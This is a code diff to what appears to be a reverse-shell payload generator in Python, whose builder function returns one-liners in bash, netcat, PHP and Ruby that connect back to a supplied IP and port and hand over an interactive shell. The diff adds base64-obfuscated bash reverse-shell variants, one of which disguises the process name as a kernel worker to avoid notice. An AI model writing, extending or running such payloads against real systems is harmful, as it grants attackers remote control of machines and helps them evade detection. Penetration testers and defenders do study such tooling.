@@ -1,5 +1,6 @@
 from __future__ import annotations
 
+import base64
 import subprocess
 from typing import Optional
 
@@ -20,6 +21,10 @@ def _get_interfaces() -> dict[str, str]:
         pass
     return result
 
+def _b64_payload(ip: str, port: int) -> str:
+    raw = f'bash -i >& /dev/tcp/{ip}/{port} 0>&1'
+    return base64.b64encode(raw.encode()).decode()
+
 def _build_payloads(ip: str, port: int) -> dict[str, str]:
     return {
         "bash":        f'bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"',
@@ -30,6 +35,9 @@ def _build_payloads(ip: str, port: int) -> dict[str, str]:
         "nc (mkfifo)": f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {ip} {port} >/tmp/f',
         "php":         f'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/bash -i <&3 >&3 2>&3");\'',
         "ruby":        f'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)\'',
+        "memfd (bash)":        f'bash <(echo "{_b64_payload(ip, port)}" | base64 -d)',
+        "memfd (spoof argv)":  f'exec -a \'[kworker/0:1]\' bash <(echo "{_b64_payload(ip, port)}" | base64 -d)',
+        "memfd (sh compat)":   f'bash <(printf \'%s\' "{_b64_payload(ip, port)}" | base64 -d)',
     }
 
 class PayloadGenerator:
